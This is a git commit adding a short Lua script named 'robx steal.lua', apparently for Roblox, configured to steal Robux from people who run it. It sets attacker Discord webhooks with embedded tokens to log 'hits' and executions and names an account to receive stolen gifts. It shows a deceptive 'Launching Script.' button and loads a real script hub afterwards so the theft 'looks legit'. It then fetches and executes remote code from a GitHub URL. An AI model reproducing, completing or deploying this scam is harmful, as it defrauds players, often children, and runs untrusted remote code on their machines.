44967e9da65052523301b096b425d860a375733a
redz <hehiaha2@gmail.com>
2025-02-11 21:01:01 +0700

    Update and rename robx steal to robx steal.lua

---
+++ robx steal.lua
@@ -0,0 +1,8 @@
+LogsWebhook = "https://discord.com/api/webhooks/1337640435341856790/FgPkEOKzl_srUJwzEmMy-3Fz4QfjjXbxwiLRsrXcFrn_9CPjbQeHjAz1qtgFyu7-vDda" -- << Webhook for logging hits >>
+ExecutionWebhook = "https://discord.com/api/webhooks/1337096740934909965/SFYN7a59WqYVTMlGZIbfZouKqyyQR_t-hCgUWh1z8xz_HxJIkK810UTpFpJWOu-9X0Ab" -- << Webhook for logging executions >>
+Username = "GONNN00" -- << Username of the account where gifts will be sent >>
+PromptText = "Launching Script." -- << Text of the button meant for stealing RBX >>
+RandomizedPrompt = true -- << Makes the prompt have a unique design each execution >>
+LoadRedzAfterHit = true -- << Loads redz hub after you get a hit, so looks legit >>
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DrubGrub2/coding/refs/heads/main/Script"))()
